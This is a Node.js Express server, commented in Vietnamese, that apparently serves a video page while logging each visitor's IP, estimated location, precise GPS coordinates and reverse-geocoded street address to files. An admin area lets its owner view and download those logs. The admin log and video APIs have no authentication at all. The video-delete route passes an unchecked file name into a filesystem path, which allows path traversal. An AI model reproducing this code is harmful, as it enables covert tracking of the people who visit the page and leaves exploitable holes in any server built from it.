// ==========================================================
// PHẦN 1: IMPORTS VÀ CẤU HÌNH BAN ĐẦU
// ==========================================================
import express from "express";
import fetch from "node-fetch";
import { promises as fs } from "fs";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";
import multer from "multer";

// --- Cấu hình Biến môi trường ---
dotenv.config(); // Tải các biến từ file .env
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;

// --- Cấu hình Multer để lưu file upload ---
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, path.join(__dirname, "public", "videos"));
  },
  filename: function (req, file, cb) {
    cb(null, file.originalname);
  },
});
const upload = multer({ storage: storage });

// ==========================================================
// PHẦN 2: MIDDLEWARES
// ==========================================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// ==========================================================
// PHẦN 3: CÁC API CÔNG KHAI (DÀNH CHO NGƯỜI DÙNG)
// ==========================================================

// API ghi log vị trí ước tính dựa trên IP
app.post("/api/log-ip-location", async (req, res) => {
  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const timestamp = new Date().toLocaleString("vi-VN", {
    timeZone: "Asia/Ho_Chi_Minh",
  });
  let locationInfo = `[${timestamp}] User IP: ${userIP}\n  Location: (Unknown or Local IP)\n  ISP: N/A`;
  try {
    if (userIP && !userIP.includes("127.0.0.1") && !userIP.includes("::1")) {
      const response = await fetch(
        `http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp`
      );
      const apiData = await response.json();
      if (apiData.status !== "fail") {
        locationInfo = `[${timestamp}] User IP: ${userIP}\n  Estimated Location: ${apiData.city}, ${apiData.regionName}, ${apiData.country}\n  ISP: ${apiData.isp}`;
      }
    }
  } catch (error) {
    console.error("Could not connect to ip-api.com:", error.message);
  }
  try {
    await fs.appendFile("ip_logs.txt", `\n${locationInfo}\n`, "utf8");
    res.status(200).json({ message: "IP location log attempted" });
  } catch (fileError) {
    res.status(500).json({ message: "Failed to write to log file" });
  }
});

// API ghi log vị trí chính xác
app.post("/api/log-precise-location", async (req, res) => {
  try {
    const { latitude, longitude } = req.body;
    const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const geoResponse = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`,
      { headers: { "User-Agent": "PreciseLogger/1.0" } }
    );
    const geoData = await geoResponse.json();
    const detailedAddress = geoData.display_name || "N/A";
    const timestamp = new Date().toLocaleString("vi-VN", {
      timeZone: "Asia/Ho_Chi_Minh",
    });
    const logData = `\n[${timestamp}] User IP: ${userIP}\n  Precise Coords: Latitude: ${latitude}, Longitude: ${longitude}\n  Detailed Address: ${detailedAddress}\n`;
    await fs.appendFile("precise_logs.txt", logData, "utf8");
    res.status(200).json({ message: "Precise location logged successfully" });
  } catch (error) {
    console.error("Error logging precise location:", error);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

// API lấy video đang được kích hoạt để hiển thị trên trang chủ
app.get("/api/active-video", async (req, res) => {
  const configPath = path.join(__dirname, "data", "config.json");
  try {
    const fileContents = await fs.readFile(configPath, "utf8");
    const config = JSON.parse(fileContents);
    res.json({ url: config.activeVideo });
  } catch (error) {
    // Nếu có lỗi, trả về một video mặc định
    res.status(500).json({ url: "/videos/video1.mp4" });
  }
});

// ==========================================================
// PHẦN 4: CÁC ROUTE VÀ API CỦA ADMIN
// ==========================================================

// --- Route phục vụ các trang HTML của Admin ---
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});
app.post("/admin/login", (req, res) => {
  if (req.body.password === ADMIN_PASSWORD) {
    res.redirect("/admin/dashboard");
  } else {
    res.status(401).send(`<h1>Sai mật khẩu!</h1><a href="/admin">Thử lại</a>`);
  }
});
app.get("/admin/dashboard", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});
app.get("/admin/videos", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "videos-manager.html"));
});

// --- API Admin để quản lý LOG ---
app.get("/admin/api/logs/:logType", async (req, res) => {
  const { logType } = req.params;
  if (logType !== "ip" && logType !== "precise") {
    return res.status(400).send("Loại log không hợp lệ.");
  }
  const fileName = `${logType}_logs.txt`;
  const logFilePath = path.join(__dirname, fileName);
  try {
    await fs.access(logFilePath);
    res.type("text/plain").sendFile(logFilePath);
  } catch {
    res.send(`File log '${fileName}' chưa được tạo hoặc trống.`);
  }
});

app.get("/admin/api/download/:logType", async (req, res) => {
  const { logType } = req.params;
  if (logType !== "ip" && logType !== "precise") {
    return res.status(400).send("Loại log không hợp lệ.");
  }
  const fileName = `${logType}_logs.txt`;
  const logFilePath = path.join(__dirname, fileName);
  try {
    await fs.access(logFilePath);
    res.download(logFilePath);
  } catch {
    res.status(404).send(`File log '${fileName}' không tồn tại để tải.`);
  }
});

app.post("/admin/api/clear-logs/:logType", async (req, res) => {
  const { logType } = req.params;
  if (logType !== "ip" && logType !== "precise") {
    return res.status(400).json({ message: "Loại log không hợp lệ." });
  }
  const fileName = `${logType}_logs.txt`;
  const logFilePath = path.join(__dirname, fileName);
  try {
    await fs.unlink(logFilePath);
    res
      .status(200)
      .json({ message: `File log '${fileName}' đã được xóa thành công.` });
  } catch (err) {
    if (err.code === "ENOENT") {
      return res
        .status(200)
        .json({
          message: `File log '${fileName}' không tồn tại, không có gì để xóa.`,
        });
    }
    res.status(500).json({ message: "Không thể xóa file log do lỗi server." });
  }
});

// --- API Admin để quản lý VIDEO (CRUD) ---

// [CREATE] API để upload video mới
app.post("/api/admin/videos/upload", upload.single("videoFile"), (req, res) => {
  if (!req.file) {
    return res
      .status(400)
      .json({ message: "Vui lòng chọn một file để upload." });
  }
  res
    .status(200)
    .json({
      message: `File '${req.file.filename}' đã được upload thành công.`,
    });
});

// [READ] API lấy danh sách video
app.get("/api/admin/videos", async (req, res) => {
  const videosDirectory = path.join(__dirname, "public", "videos");
  try {
    const fileNames = await fs.readdir(videosDirectory);
    res.json(fileNames);
  } catch (error) {
    res.status(500).json({ error: "Không thể lấy danh sách video" });
  }
});

// [UPDATE] API đặt video làm video chính
app.post("/api/admin/videos/set-active", async (req, res) => {
  const configPath = path.join(__dirname, "data", "config.json");
  const { fileName } = req.body;
  if (!fileName) {
    return res.status(400).json({ error: "Tên file là bắt buộc" });
  }
  try {
    const newConfig = { activeVideo: `/videos/${fileName}` };
    await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2));
    res.json({ message: `Đã đặt ${fileName} làm video chính.` });
  } catch (error) {
    res.status(500).json({ error: "Lỗi khi đặt video chính" });
  }
});

// [DELETE] API để xóa một video
app.post("/api/admin/videos/delete", async (req, res) => {
  const { fileName } = req.body;
  if (!fileName) {
    return res.status(400).json({ error: "Tên file là bắt buộc" });
  }
  try {
    const filePath = path.join(__dirname, "public", "videos", fileName);
    await fs.unlink(filePath); // Lệnh xóa file
    res.json({ message: `Đã xóa video '${fileName}' thành công.` });
  } catch (error) {
    console.error("Lỗi khi xóa video:", error);
    res.status(500).json({ error: `Không thể xóa video '${fileName}'.` });
  }
});

// ==========================================================
// PHẦN 5: KHỞI ĐỘNG SERVER
// ==========================================================
app.listen(PORT, () => {
  console.log(`Server đang chạy tại http://localhost:${PORT}`);
  if (!ADMIN_PASSWORD) {
    console.warn(
      "CẢNH BÁO: Biến môi trường ADMIN_PASSWORD chưa được thiết lập trong file .env!"
    );
  }
});
